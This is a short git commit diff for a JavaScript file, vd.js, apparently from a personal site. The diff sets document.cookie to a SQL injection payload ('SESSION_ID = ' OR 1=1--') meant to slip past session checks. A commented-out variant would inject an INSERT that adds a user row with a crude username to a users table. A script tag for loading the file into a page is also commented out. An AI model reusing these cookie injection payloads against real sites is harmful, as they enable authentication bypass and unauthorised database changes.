94672256204efbb5c0c8325fcbca44d193f377b1
1114599115@qq.com <alksdj1029a>
2018-10-24 20:54:29 -0700

    Site updated: 2018-10-24 20:54:26

--- vd.js
+++ vd.js
@@ -1,2 +1,5 @@
-var s = "' or 1=1;--";
+// var s = "SESSION_ID = \';INSERT INTO users VALUES (\'fucker\', \'77777\', \'/static/images/dirks.jpg\', 0);--";
+var s = "SESSION_ID = ' OR 1=1--";
 document.cookie = s;
+// console.log(document.cookie);
+//<script type="text/javascript" src="static/vd.js"></script>
